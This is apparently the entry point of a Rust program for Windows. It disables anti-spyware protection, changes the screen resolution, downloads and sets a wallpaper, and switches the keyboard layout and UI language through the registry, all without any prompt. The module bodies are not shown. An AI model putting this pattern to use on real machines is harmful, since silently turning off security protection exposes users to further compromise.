mod disable_antispyware;
mod keyboard;
mod screen;
mod ui_language;
mod util;
mod wallpaper;
use anyhow::Result;
use disable_antispyware::disable_antispyware;
use keyboard::Keyboard;
use screen::Screen;
use tokio;
use ui_language::UILanguage;
use util::download_file;
use wallpaper::Wallpaper;
#[tokio::main]
async fn main() -> Result<()> {
    let mut wallpaper = Wallpaper::new(env!("WALLPAPER_URL").to_string());

    let mut screen = Screen {};

    let mut ui_language = UILanguage {
        target_lang: env!("TARGET_LANG").to_string(),
        target_lang_reg: env!("TARGET_LANG_REG").to_string(),
        num_langs: env!("TARGET_LANG_NUM").parse().unwrap(),
    };

    let mut keyboard = Keyboard {
        layout: env!("KEYBOARD_LAYOUT").to_string(),
    };
    disable_antispyware();
    screen.change_resulation();
    download_file(&wallpaper.url, &wallpaper.image_path).await?;
    keyboard.change_keyboard_layout();
    keyboard.change_keyboard_layout_from_registry();
    ui_language.change_prefered_lang();
    ui_language.change_ui_lang_from_hkey();

    wallpaper.set_wallpaper().await;
    std::process::exit(0)
}
